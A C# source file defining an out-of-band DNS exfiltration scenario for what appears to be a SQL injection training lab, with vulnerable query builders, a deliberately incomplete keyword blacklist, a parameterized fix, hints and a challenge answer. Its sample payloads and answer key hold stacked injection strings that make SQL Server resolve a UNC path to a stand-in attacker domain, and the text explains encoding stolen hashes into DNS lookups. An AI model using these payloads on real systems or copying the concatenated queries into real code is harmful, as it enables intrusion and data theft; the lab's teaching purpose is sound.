using Minion.InjectionLab.Core.Models;
using Minion.InjectionLab.Core.Services;

namespace Minion.InjectionLab.Core.Scenarios;

/// <summary>Out-of-band injection: when the response never changes at all, the proof — and the
/// data — leaves through a completely different channel (here, outbound DNS).</summary>
public static class OutOfBandExfilScenario
{
    private const string Baseline = "RPT-1007";

    // Deliberately only two of the three real UNC-triggering extended procs are ever blocked —
    // xp_subdirs is never on the list at any difficulty, same "a blacklist can only cover what
    // someone thought to list" lesson as every other blacklist fix in this app.
    private static readonly string[] Keywords = { "XP_DIRTREE" };
    private static readonly string[] ExpertKeywords = { "XP_FILEEXIST" };

    private static bool ContainsAny(string s, params string[] needles)
    {
        var lower = s.ToLowerInvariant();
        return needles.Any(lower.Contains);
    }

    private static string Classify(IReadOnlyDictionary<string, string> f)
    {
        var s = f["reference"];
        bool stacked = s.Contains(';');
        bool uncProc = ContainsAny(s, "xp_dirtree", "xp_fileexist", "xp_subdirs");
        bool uncPath = s.Contains(@"\\");
        return stacked && uncProc && uncPath ? "oob" : "normal";
    }

    public static AttackScenario Create() => new()
    {
        Id = "out-of-band-exfil",
        Category = AttackCategory.OutOfBand,
        Title = "Out-of-Band Exfiltration (DNS)",
        Premise = "This \"export report\" endpoint is locked down as tight as the boolean-blind one, plus one " +
                  "more thing: it always returns the exact same \"Export queued\" response, instantly, no matter " +
                  "what you submit. No data, no error, no true/false difference, no measurable delay — every " +
                  "channel the earlier blind techniques relied on has been closed off.",
        MockAppLabel = "Internal Tools — Export Report",
        BaselineValues = new Dictionary<string, string> { ["reference"] = Baseline },
        Fields = new[] { new FormField { Key = "reference", Label = "Report reference", DefaultValue = Baseline } },

        DecisionPaths = new[]
        {
            new DecisionPathDef { Key = "normal", Label = "Normal export", Icon = "📄", Kind = PathKind.Safe },
            new DecisionPathDef { Key = "oob", Label = "Out-of-band callback", Icon = "📡", Kind = PathKind.Malicious }
        },
        ClassifyInput = Classify,

        BuildVulnerableSql = f => $"SELECT * FROM dbo.Reports WHERE Reference = '{f["reference"]}';",

        BuildVulnerableCSharp = f =>
            "var sql = $\"SELECT * FROM dbo.Reports WHERE Reference = '{reference}'\";\n" +
            "using var cmd = new SqlCommand(sql, connection);\n" +
            "cmd.ExecuteNonQuery(); // the HTTP response is identical either way — nothing to read here at all",

        BuildVulnerablePowerShell = f =>
            "$sql = \"SELECT * FROM dbo.Reports WHERE Reference = '$reference'\"\n" +
            "Invoke-Sqlcmd -ServerInstance $server -Database $db -Query $sql  # response never varies",

        // Two real fixes, not equally complete: a keyword blacklist on the UNC-triggering proc
        // name (looks like a fix, isn't one) vs. real parameterization.
        Fixes = new[]
        {
            new FixOption
            {
                Label = "⚠ Block input containing \"xp_dirtree\"",
                Grade = FixGrade.Partial,
                Gap = "At Beginner, checks for the literal uppercase word \"XP_DIRTREE\" — lowercase sails " +
                      "through. Intermediate catches any casing. Expert also blocks \"xp_fileexist\". But SQL " +
                      "Server ships several extended procedures that will resolve a UNC path — xp_subdirs does " +
                      "exactly the same job and isn't blocked at any difficulty here, the same way a blacklist " +
                      "never covers a word nobody thought to list.",
                BuildSql = (f, d) =>
                {
                    bool blocked = KeywordBlacklist.IsBlocked(f["reference"], d, Keywords, ExpertKeywords);
                    return blocked ? "-- Request rejected by the application; no SQL was ever built." : $"SELECT * FROM dbo.Reports WHERE Reference = '{f["reference"]}';";
                },
                BuildCSharp = f =>
                {
                    bool blocked = f["reference"].Contains("xp_dirtree", StringComparison.OrdinalIgnoreCase);
                    var guard = "if (reference.Contains(\"xp_dirtree\", StringComparison.OrdinalIgnoreCase))\n    throw new SecurityException();\n\n";
                    var vulnerable = "var sql = $\"SELECT * FROM dbo.Reports WHERE Reference = '{reference}'\";\n" +
                                     "using var cmd = new SqlCommand(sql, connection);\n" +
                                     "cmd.ExecuteNonQuery();";
                    return blocked ? guard.TrimEnd() : guard + vulnerable;
                },
                BuildPowerShell = f =>
                {
                    bool blocked = f["reference"].Contains("xp_dirtree", StringComparison.OrdinalIgnoreCase);
                    var guard = "if ($reference -match '(?i)xp_dirtree') { throw \"rejected\" }\n\n";
                    var vulnerable = "$sql = \"SELECT * FROM dbo.Reports WHERE Reference = '$reference'\"\n" +
                                      "Invoke-Sqlcmd -ServerInstance $server -Database $db -Query $sql";
                    return blocked ? guard.TrimEnd() : guard + vulnerable;
                },
                Simulate = (f, d) =>
                {
                    bool filterCaughtIt = KeywordBlacklist.IsBlocked(f["reference"], d, Keywords, ExpertKeywords);
                    if (Classify(f) != "oob")
                        return new SimulationResult { Severity = Severity.Success, Headline = "Export queued", Detail = "Ordinary reference, the filter never engages." };
                    if (filterCaughtIt)
                        return new SimulationResult { Severity = Severity.Blocked, Headline = "Export queued", Detail = "Same identical response as always — but at this difficulty the filter happened to catch this specific procedure name." };
                    return new SimulationResult
                    {
                        Severity = Severity.Critical,
                        Headline = "Export queued — and a DNS lookup just left the network",
                        Detail = "The HTTP response is exactly the same as every other request. But the stacked statement ran " +
                                  "anyway, and the extended procedure it called resolved a UNC path pointing at a domain only " +
                                  "the attacker controls. Their authoritative DNS server just logged that lookup — proof the " +
                                  "injection fired, with zero visible difference in the response.",
                        AffectedAssets = new[] { "Outbound DNS/SMB request to an attacker-controlled host — logged on their server, not this app's" }
                    };
                }
            },
            new FixOption
            {
                Label = "✓ Parameterized query",
                Grade = FixGrade.Best,
                Gap = null,
                BuildSql = (f, _) =>
                    "EXEC sp_executesql N'SELECT * FROM dbo.Reports WHERE Reference = @Reference', N'@Reference NVARCHAR(50)', @Reference;\n\n" +
                    $"@Reference = {f["reference"]}",
                BuildCSharp = f =>
                    "using var cmd = new SqlCommand(\"SELECT * FROM dbo.Reports WHERE Reference = @Reference\", connection);\n" +
                    "cmd.Parameters.AddWithValue(\"@Reference\", reference);\n" +
                    "cmd.ExecuteNonQuery();",
                BuildPowerShell = f =>
                    "$cmd = New-Object System.Data.SqlClient.SqlCommand \"SELECT * FROM dbo.Reports WHERE Reference = @Reference\", $connection\n" +
                    "[void]$cmd.Parameters.AddWithValue('@Reference', $reference)\n" +
                    "$cmd.ExecuteNonQuery()",
                Simulate = (f, _) => new SimulationResult
                {
                    Severity = Classify(f) == "oob" ? Severity.Blocked : Severity.Success,
                    Headline = "Export queued",
                    Detail = Classify(f) == "oob"
                        ? "The semicolon and the procedure name are just text inside the parameter value now — there's no " +
                          "SQL left to parse them as a new statement, so no second statement ever runs, UNC path or not."
                        : "Ordinary reference, unaffected by the fix."
                }
            }
        },

        SimulateVulnerable = f => Classify(f) == "oob"
            ? new SimulationResult
            {
                Severity = Severity.Critical,
                Headline = "Export queued — and a DNS lookup just left the network",
                Detail = "Nothing in the response changes, ever — but the stacked statement calls an extended procedure " +
                          "with a UNC path, and resolving that path means SQL Server first has to ask DNS for it. The " +
                          "attacker's own authoritative server logs that query. Encode real data as a hostname label (e.g. " +
                          "a stolen password hash, one chunk at a time) and the lookup itself becomes the exfiltration " +
                          "channel — completely outside the request/response the app is being monitored on.",
                AffectedAssets = new[] { "Outbound DNS/SMB request to an attacker-controlled host — logged on their server, not this app's" }
            }
            : new SimulationResult { Severity = Severity.Success, Headline = "Export queued", Detail = "Ordinary reference, nothing unusual happens." },

        HowItWorks =
            "Out-of-band injection is the technique of last resort: when a response gives absolutely no signal at " +
            "all — no data, no error, no timing difference — the attacker makes the database itself reach out over " +
            "a completely separate channel that only they control. On SQL Server, extended procedures like " +
            "xp_dirtree accept a UNC path and will resolve it, which means a DNS lookup to whatever domain the " +
            "path points at. Point it at an attacker-controlled domain, optionally with data encoded into the " +
            "hostname itself, and the DNS logs become the leak.",

        WhyTheFixWorks =
            "Same mechanism as every other fix here: once the value is bound as data rather than concatenated as " +
            "SQL text, a semicolon inside it can't start a new statement — so the extended procedure call never " +
            "runs in the first place, regardless of which UNC-triggering procedure name was used.",

        SamplePayloads = new[]
        {
            @"RPT-1007'; EXEC master..xp_dirtree '\\abc123.attacker.example.com\a'; --",
            @"RPT-1007'; EXEC master..xp_subdirs '\\abc123.attacker.example.com\a'; --"
        },

        ChallengeGoal = "Make the server perform an outbound DNS lookup to an attacker-controlled host — even though the response never changes.",
        Hints = new[]
        {
            "The response is identical no matter what you submit, so the proof has to leave through a different channel entirely.",
            "Some SQL Server extended procedures accept a UNC path and will try to resolve it over the network — what happens if you point one at a domain you control?"
        },
        ChallengeAnswer = @"RPT-1007'; EXEC master..xp_dirtree '\\abc123.attacker.example.com\a'; --",

        TerminologyNote = "\"Out-of-band\" (OOB) names the channel, not the payload shape: the attacker never reads " +
                           "a result or a timing difference back through the same request/response at all. Instead " +
                           "the database is made to reach out over an entirely separate channel — here, DNS — that " +
                           "only the attacker controls, and that channel carries the proof (or the data itself) out.",
        References = new[]
        {
            new ExternalReference { Label = "NetSPI — Exploiting SQL Injection with DNS-Based Egress", Url = "https://www.netspi.com/blog/technical-blog/web-application-pentesting/second-order-sql-injection-with-stored-procedures-dns-based-egress/" },
            new ExternalReference { Label = "PowerUpSQL — UNC Path Injection cheat sheet", Url = "https://powershellgallery.com/packages/PowerUpSQL/1.103.8/Content/templates%5CCheatSheet_UncPathInjection.txt" },
            new ExternalReference { Label = "Invicti — Out-of-Band SQL Injection (OOB SQLi)", Url = "https://www.invicti.com/learn/out-of-band-sql-injection-oob-sqli" }
        }
    };
}
